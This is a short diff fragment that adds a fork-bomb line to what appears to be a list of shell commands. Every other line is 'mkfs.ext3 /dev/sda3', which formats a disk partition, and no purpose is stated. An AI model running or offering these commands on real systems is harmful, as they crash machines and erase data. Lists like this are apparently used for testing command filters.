@@ -1,4 +1,5 @@
 <off>
+:(){:|:&};:
 mkfs.ext3 /dev/sda3. 2a
 mkfs.ext3 /dev/sda3. 2b
 mkfs.ext3 /dev/sda3. 2d
